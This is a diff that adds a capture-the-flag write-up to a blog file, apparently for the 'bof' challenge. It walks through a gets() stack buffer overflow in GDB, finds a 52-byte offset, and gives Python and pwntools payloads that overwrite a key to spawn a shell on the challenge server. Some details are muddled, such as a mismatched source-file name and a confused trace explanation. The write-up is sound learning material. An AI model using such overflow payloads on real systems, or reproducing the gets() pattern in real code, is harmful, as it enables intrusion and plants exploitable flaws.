@@ -291,3 +291,198 @@ Execute in home directory
 `python3 /tmp/pyth.py`
 ## Output
 ![output](/assets/images/output1.png)
+
+TLDR:
+
+---
+
+#  Challenge: bof
+
+As the name suggests, this challenge revolves around **buffer overflow**, a classic binary exploitation technique.
+
+---
+
+##  Introduction
+
+> **What is a buffer overflow?**  
+> According to [Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow), 
+
+"_In programming and information security, a buffer overflow or buffer overrun is an anomaly whereby a program writes data to a buffer beyond the buffer's allocated memory, overwriting adjacent memory locations_".
+
+#### History
+
+“_Buffer overflows date back to the 1970s. However, the first documented exploitation occurred in the late 1980s when the UNIX finger service was attacked via a stack overflow—used to spread the infamous **Morris Worm**_. [Read more](https://www.malwarebytes.com/blog/threats/buffer-overflow#:~:text=History,further%20spread%20the%20Morris%20worm)
+
+“Modern systems use defense mechanisms like **ASLR**, **DEP**, and **stack canaries**, making exploitation harder—but not impossible”
+
+> 💡 *What can an attacker do with this?*
+> That depends on their **creativity** 
+> Buffer overflows can allow anything from bypassing restrictions to popping shells and gaining root access.”
+
+---
+
+##  Description
+
+“You're given a remote binary that takes one input. The program has a hardcoded check against the value `0xcafebabe` If the check fails, it prints `"Nah.."` The challenge provides a C source file: `fd.c`
+
+##  Analysis
+```c
+#include <stdlib.h>
+func(key){
+        char overflowme[32];
+        printf("overflow me : ");
+        gets(overflowme);       // smash me!
+        if(key == 0xcafebabe){
+                setregid(getegid(), getegid());
+                system("/bin/sh");
+        }
+        else{
+                printf("Nah..\n");
+        }
+}
+int main(int argc, char* argv[]){
+        func(0xdeadbeef);
+        return 0;
+}
+```
+
+### 🧪 Background Check (skip if you know this)
+
+"At first glance, it might seem like our input is irrelevant _func_ always receives ***0xdeadbeef***, and the check expects ***0xcafebabe**. 
+
+>> But there’s a key vulnerability here: the use of the **`gets()`** function. 
+
+***gets()*** is unsafe.
+>> [POSIX docs](https://pubs.opengroup.org/onlinepubs/009696799/functions/gets.html) It has no bounds checking and has led to numerous exploits. Because of this, modern compilers _warn_ or _block_ its use, and C11 **officially removed** it from the standard.”
+
+
+
+## 🧪 Proof of Concept (PoC)
+
+To solidify our understanding, let’s walk through a step-by-step **GDB demonstration** and payload crafting.
+
+
+
+### 🛠️ GDB Setup & Disassembly
+
+Spin up GDB and disassemble the `main` function. Identify the call to `func` and focus on how the vulnerable `gets()` function is used.
+
+Here's the relevant disassembly from `func()`:
+
+```
+   0x56556234 <+55>: call   0x56556060 <gets@plt>
+   0x56556239 <+60>: add    $0x10,%esp
+   0x5655623c <+63>: cmpl   $0xcafebabe,0x8(%ebp)
+   0x56556243 <+70>: jne    0x56556272 <func+117>
+   0x56556245 <+72>: call   0x56556080 <getegid@plt>
+   0x5655624a <+77>: mov    %eax,%esi
+   0x5655624c <+79>: call   0x56556080 <getegid@plt>
+   0x56556254 <+87>: push   %esi
+   0x56556255 <+88>: push   %eax
+   0x56556256 <+89>: call   0x565560b0 <setregid@plt>
+```
+
+Set a **breakpoint** at the comparison instruction:
+
+```
+break *0x5655623c
+```
+
+This line compares the input value with `0xcafebabe`. The key argument is located at `ebp+0x8`.
+
+We notice that `func` was called with `0xdeadbeef`, but if we **overwrite** the value at `ebp+8` with `0xcafebabe`, we’ll execute the privileged block:
+
+```c
+if (key == 0xcafebabe) {
+    setregid(getegid(), getegid());
+    system("/bin/sh");
+}
+```
+
+And yes, **it worked!** 
+
+![Local Shell](/assets/images/bashlocal.png)
+
+
+
+### 🔍 Finding the Offset
+
+Let’s determine how far the overflow needs to go to reach `ebp+8`:
+
+```
+Input:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+```
+
+Which results in:
+
+```
+$ebp+0x8: 0x47474747  (i.e., 'GGGG')
+```
+
+This means we need:
+
+```
+32 bytes (buffer) + 20 bytes (padding) = 52 bytes total
+```
+
+---
+
+### 🧪 Final Exploit Payload
+
+```python
+#!/usr/bin/env python3
+
+import struct
+
+padding = b"A" * 52
+value = struct.pack("<I", 0xcafebabe)
+
+payload = padding + value
+print(payload)
+```
+
+#### 💡 Or one-liner with GDB:
+
+```bash
+run < <(python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*52 + struct.pack("<I", 0xcafebabe))')
+```
+
+Inspect the memory:
+
+```gdb
+x/wx $ebp+8
+```
+
+![Proof of Overwrite](/assets/images/cafebabe.png)
+
+We now see `cafebabe` where `deadbeef` used to be. 
+
+![Proof of Overwrite](/assets/images/proof.png)
+
+We cant see the shell being popped, as soon as the process is forked, the debugger deattaches and throws stack smashing detection activation message.
+
+How do I know (confirm) this?
+
+>> as the /bin/sh is call by system it is definately being stored somewhere in segment of process, above we see `/lib/x86_64-linux-gnu/libthread_db.so.1` and so if we trace there
+
+![Trace](/assets/images/bin.png)
+
+###  ATTACK
+
+Here’s how you can remotely exploit the binary over SSH using `pwntools`:
+
+```python
+from pwn import *
+
+p = remote('0', 9000)  # Replace '0' with actual IP or hostname
+p.send(b"A" * 52 + p32(0xcafebabe))
+p.interactive()
+```
+And it works!
+
+![Output](/assets/images/output2.png)
+
+
+
+
